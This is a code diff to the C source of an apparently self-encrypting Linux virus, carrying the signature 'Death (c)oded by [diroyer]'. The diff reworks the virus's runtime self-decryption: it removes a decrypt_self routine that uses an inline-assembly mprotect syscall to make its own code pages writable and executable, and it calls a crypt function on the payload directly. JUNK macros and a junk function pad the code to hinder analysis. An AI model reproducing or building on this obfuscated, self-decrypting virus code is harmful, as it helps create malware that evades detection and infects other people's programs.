@@ -18,7 +18,9 @@ void _start(void) {
 	char **argv = (char **)(rbp + 16); JUNK;
 	char **envp = argv + argc + 1; JUNK;
 
-	decrypt_self();
+	if (g_im_encrypted == true)
+		crypt((uint8_t *)(uintptr_t)&real_start, g_payload_size, 1);
+
 	entrypoint((int)argc, argv, envp);
 
 	__asm__ __volatile__ (
@@ -41,7 +43,7 @@ char	TEXT_VAR g_signature[SIGNATURE_SIZE] = \
 "Death (c)oded by [diroyer] - deadbeaf:0000\n\0";
 
 //uint8_t	TEXT_VAR g_key[KEY_SIZE] = {0};
-bool	TEXT_VAR g_is_encrypted = false;
+bool	TEXT_VAR g_im_encrypted = false;
 
 int		TEXT_VAR g_start_offset = ORIG_TEXT_OFF;
 char	TEXT_VAR **g_envp = NULL;
@@ -67,35 +69,4 @@ void junk_main(void) {
 	*ptr >>= hello[16];
 	*ptr ^= hello[17];
 	*ptr ^= hello[18];
-}
-
-void decrypt_self(void)
-{
-	if (g_is_encrypted == false) {
-		return;
-	} JUNK;
-
-	if (g_start_offset == ORIG_TEXT_OFF) {
-
-		uintptr_t start = (uintptr_t)&_start;
-		uintptr_t end = start + VIRUS_SIZE;
-
-		uintptr_t page_start = start & ~(PAGE_SIZE - 1);
-		uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
-
-		__asm__ __volatile__ (
-				"movq %0, %%rax\n"
-				"movq %1, %%rdi\n"
-				"movq %2, %%rsi\n"
-				"movq %3, %%rdx\n"
-				"syscall\n"
-				: /* no output */
-				: "r"((long)SYS_mprotect), "r"(page_start), "r"(page_end - page_start), "r"((long)(PROT_READ | PROT_WRITE | PROT_EXEC))
-				: "rax", "rdi", "rsi", "memory" /* clobber */
-			);
-
-	} JUNK;
-
-	crypt((uint8_t *)(uintptr_t)&real_start, g_payload_size);
-	return;
 }
